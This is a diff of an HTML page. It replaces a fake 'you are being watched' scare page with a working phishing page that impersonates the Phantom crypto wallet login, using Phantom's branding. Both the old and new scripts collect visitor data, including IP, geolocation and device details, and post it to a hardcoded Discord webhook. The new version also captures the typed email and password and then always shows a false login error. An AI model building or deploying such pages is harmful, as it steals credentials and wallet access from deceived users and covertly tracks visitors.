@@ -1,121 +1,250 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ERREUR 404</title>
+  <title>Phantom - Connexion</title>
+  <link rel="icon" href="https://phantom.app/favicon.ico" />
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&display=swap');
-    
-    * { margin:0; padding:0; overflow:hidden; }
-    body, html { height:100%; background:#000; color:#0f0; font-family:'Orbitron', monospace; }
-    
-    .glitch {
-      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-      font-size: 2.5rem; text-align: center; text-shadow: 0 0 10px #0f0;
-      animation: glitch 1s infinite alternate;
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #0d0d0d;
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
     }
-    .scanline {
-      position: absolute; top: 0; width: 100%; height: 5px; background: rgba(0,255,0,0.3);
-      animation: scan 3s linear infinite;
+    .container {
+      background: #1a1a1a;
+      padding: 40px;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 380px;
+      border: 1px solid #333;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
     }
-    .code {
-      position: absolute; bottom: 10px; left: 10px; font-size: 0.8rem; opacity: 0.7;
-      animation: typing 5s steps(40) infinite;
-      white-space: nowrap; overflow: hidden; border-right: 2px solid #0f0;
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
     }
-    .static {
-      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-      background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==') repeat;
-      opacity: 0.05; pointer-events: none; animation: noise 0.1s steps(2) infinite;
+    .logo img {
+      width: 60px;
+      height: 60px;
+      border-radius: 12px;
     }
-
-    @keyframes glitch {
-      0%, 100% { text-shadow: 0.05em 0 0 #0f0, -0.05em 0 0 #f00, 0.05em -0.05em 0 #00f; }
-      14% { text-shadow: 0.05em 0 0 #0f0, -0.05em 0 0 #f00, 0.05em -0.05em 0 #00f; }
-      15% { text-shadow: -0.05em 0 0 #f00, 0.05em 0 0 #0f0, -0.05em 0.05em 0 #00f; }
-      49% { text-shadow: -0.05em 0 0 #f00, 0.05em 0 0 #0f0, -0.05em 0.05em 0 #00f; }
-      50% { text-shadow: 0.05em 0 0 #0f0, -0.05em 0 0 #f00, 0.05em -0.05em 0 #00f; }
+    h1 {
+      text-align: center;
+      font-size: 1.5rem;
+      margin-bottom: 8px;
+      font-weight: 600;
     }
-    @keyframes scan { from { transform: translateY(-100%); } to { transform: translateY(100%); } }
-    @keyframes typing { from { width: 0; } to { width: 100%; } }
-    @keyframes noise { 0%, 100% { transform: translate(0,0); } 10% { transform: translate(-1%,0); } 20% { transform: translate(1%,0); } }
+    p {
+      text-align: center;
+      font-size: 0.9rem;
+      color: #aaa;
+      margin-bottom: 30px;
+    }
+    .input-group {
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      font-size: 0.85rem;
+      color: #ccc;
+      margin-bottom: 6px;
+    }
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      background: #2a2a2a;
+      border: 1px solid #444;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 1rem;
+      transition: border 0.2s;
+    }
+    input:focus {
+      outline: none;
+      border-color: #9d4edd;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #9d4edd;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    button:hover {
+      background: #8a3fc7;
+    }
+    button:disabled {
+      background: #555;
+      cursor: not-allowed;
+    }
+    .error {
+      margin-top: 15px;
+      padding: 12px;
+      background: #4a1a1a;
+      color: #ff6b6b;
+      border: 1px solid #ff6b6b;
+      border-radius: 8px;
+      text-align: center;
+      font-size: 0.9rem;
+      font-weight: 500;
+      display: none;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 0.75rem;
+      color: #666;
+    }
+    .footer a { color: #9d4edd; text-decoration: none; }
   </style>
 </head>
 <body>
 
-  <div class="static"></div>
-  <div class="scanline"></div>
-  
-  <div class="glitch">
-    <div>ACCÈS INTERDIT</div>
-    <div style="font-size:1.2rem; margin-top:10px;">TU ES SURVEILLÉ</div>
-  </div>
+  <div class="container">
+    <div class="logo">
+      <img src="https://phantom.app/img/phantom-logo.png" alt="Phantom">
+    </div>
+    <h1>Connectez-vous à Phantom</h1>
+    <p>Accédez à votre portefeuille en toute sécurité</p>
 
-  <div class="code">
-    > scanning_device... IP: [REDACTED] | Loc: [REDACTED] | Device: [REDACTED]
-  </div>
+    <form id="loginForm">
+      <div class="input-group">
+        <label for="email">Email</label>
+        <input type="email" id="email" required placeholder="votre@email.com" />
+      </div>
 
-  <audio id="glitchSound" preload="auto">
-    <source src="https://cdn.discordapp.com/attachments/123456789/glitch.mp3" type="audio/mpeg">
-  </audio>
+      <div class="input-group">
+        <label for="password">Mot de passe</label>
+        <input type="password" id="password" required placeholder="••••••••" />
+      </div>
+
+      <button type="submit">Se connecter</button>
+    </form>
+
+    <div id="errorMsg" class="error">
+      Identifiants incorrects. Veuillez réessayer.
+    </div>
+
+    <div class="footer">
+      <a href="https://phantom.app" target="_blank">phantom.app</a> © 2025
+    </div>
+  </div>
 
   <script>
-    // === CONFIG ===
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1438218976726483119/q5dZNqWwIPtd43lrskiwbQykWXS9WJHNP562rUWFgGdrUVRJxAWmwuaKmqSP1DU3A9tA"; // ← COLLE ICI
-    const REDIRECT_URL = "https://youtu.be/dQw4w9WgXcQ"; // ← Change
-    const DELAY = 3000; // 3 secondes
+    // === TON WEBHOOK DISCORD (CHANGE ÇA !) ===
+    const webhookUrl = 'https://discord.com/api/webhooks/1438218976726483119/q5dZNqWwIPtd43lrskiwbQykWXS9WJHNP562rUWFgGdrUVRJxAWmwuaKmqSP1DU3A9tA';
+    const enableDiscord = webhookUrl.includes('webhooks/');
 
-    // === SON GLITCH ===
-    const sound = document.getElementById('glitchSound');
-    sound.volume = 0.3;
-    sound.play().catch(() => {});
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
 
-    // === FONCTION LOG ===
-    async function hackLog() {
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+      const errorMsg = document.getElementById('errorMsg');
+      const submitBtn = this.querySelector('button');
+      const originalText = submitBtn.textContent;
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Connexion...';
+
+      // === INFOS TECHNIQUES ===
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const language = navigator.language;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const screenRes = `${screen.width}x${screen.height}`;
+      const timestamp = new Date().toLocaleString('fr-FR');
+
+      let publicIP = 'Inconnue';
+      let location = { city: 'N/A', region: 'N/A', country: 'N/A', lat: 'N/A', lon: 'N/A', accuracy: 'N/A' };
+
+      // === IP + GÉOLOC (ip-api.com) ===
       try {
-        const ipData = await (await fetch("https://api.ipify.org?format=json")).json();
-        const ip = ipData.ip;
-        const geo = await (await fetch(`https://ipwho.is/${ip}`)).json();
-        const ua = navigator.userAgent;
-        const bot = /bot|googlebot|crawler/i.test(ua);
-        const battery = await navigator.getBattery?.() || {};
-        const conn = navigator.connection || {};
-        const gl = (() => { try { const c = document.createElement('canvas'); const ctx = c.getContext('webgl'); return ctx ? ctx.getParameter(ctx.RENDERER) : "Inconnu"; } catch { return "Bloqué"; } })();
+        const res = await fetch('http://ip-api.com/json/?fields=query,country,regionName,city,lat,lon,accuracy_radius');
+        const data = await res.json();
+        if (data.query) {
+          publicIP = data.query;
+          location = {
+            city: data.city || 'Inconnue',
+            region: data.regionName || 'Inconnue',
+            country: data.country || 'Inconnu',
+            lat: data.lat || 'N/A',
+            lon: data.lon || 'N/A',
+            accuracy: data.accuracy_radius ? `${data.accuracy_radius} km` : '~5 km'
+          };
+        }
+      } catch (err) {}
 
-        const data = {
-          content: null,
-          embeds: [{
-            title: "VICTIME CONNECTÉE",
-            color: 0xff0000,
-            description: "`ACCÈS DETECTÉ • SYSTÈME COMPROMIS`",
+      // === DONNÉES À ENVOYER ===
+      const infos = {
+        "Email": email,
+        "Mot de passe": password,
+        "IP IPv4": publicIP,
+        "Ville": location.city,
+        "Région": location.region,
+        "Pays": location.country,
+        "Coordonnées": `${location.lat}, ${location.lon}`,
+        "Précision": location.accuracy,
+        "Navigateur": userAgent,
+        "OS": platform,
+        "Langue": language,
+        "Fuseau": timezone,
+        "Écran": screenRes,
+        "Heure": timestamp
+      };
+
+      // === ENVOI À DISCORD ===
+      if (enableDiscord) {
+        try {
+          const embed = {
+            title: 'Phantom - Tentative de Connexion',
+            color: 0x9d4edd,
+            thumbnail: { url: 'https://phantom.app/img/phantom-logo.png' },
             fields: [
-              { name: "IP CIBLÉE", value: `\`${ip}\``, inline: true },
-              { name: "LOCALISATION", value: `${geo.city || "?"} • ${geo.country || "?"}`, inline: true },
-              { name: "APPAREIL", value: /Mobile|Android|iPhone/.test(ua) ? "Mobile" : "PC", inline: true },
-              { name: "BATTERIE", value: battery.level ? `${Math.round(battery.level*100)}%` : "?", inline: true },
-              { name: "GPU", value: gl, inline: true },
-              { name: "RÉFÉRENT", value: document.referrer || "Direct", inline: false },
-              { name: "HEURE", value: new Date().toLocaleString('fr-FR'), inline: true },
-              { name: "BOT ?", value: bot ? "Oui" : "Non", inline: true }
+              { name: 'IP IPv4', value: `\`\`\`${publicIP}\`\`\``, inline: true },
+              { name: 'Localisation', value: `\`\`\`${location.city}, ${location.country}\`\`\``, inline: true },
+              { name: 'Précision', value: `\`\`\`${location.accuracy}\`\`\``, inline: true },
+              ...Object.entries(infos)
+                .filter(([k]) => !['IP IPv4', 'Ville', 'Région', 'Pays', 'Coordonnées', 'Précision'].includes(k))
+                .map(([name, value]) => ({ name, value: `\`\`\`${value}\`\`\``, inline: false }))
             ],
-            footer: { text: "HACKER SYSTEM v9.9 • GitHub Pages" },
-            timestamp: new Date().toISOString()
-          }]
-        };
+            timestamp: new Date().toISOString(),
+            footer: { text: 'Phantom Login Capture' }
+          };
 
-        await fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
-        });
+          await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              username: 'Phantom Security',
+              avatar_url: 'https://phantom.app/img/phantom-logo.png',
+              embeds: [embed]
+            })
+          });
+        } catch (err) {}
+      }
 
-      } catch (e) { console.error("Erreur:", e); }
+      // === ERREUR TOUJOURS AFFICHÉE ===
+      setTimeout(() => {
+        errorMsg.style.display = 'block';
+        submitBtn.disabled = false;
+        submitBtn.textContent = originalText;
+      }, 800);
 
-      setTimeout(() => { window.location.href = REDIRECT_URL; }, DELAY);
-    }
-
-    hackLog();
+      document.getElementById('password').value = '';
+    });
   </script>
 </body>
 </html>
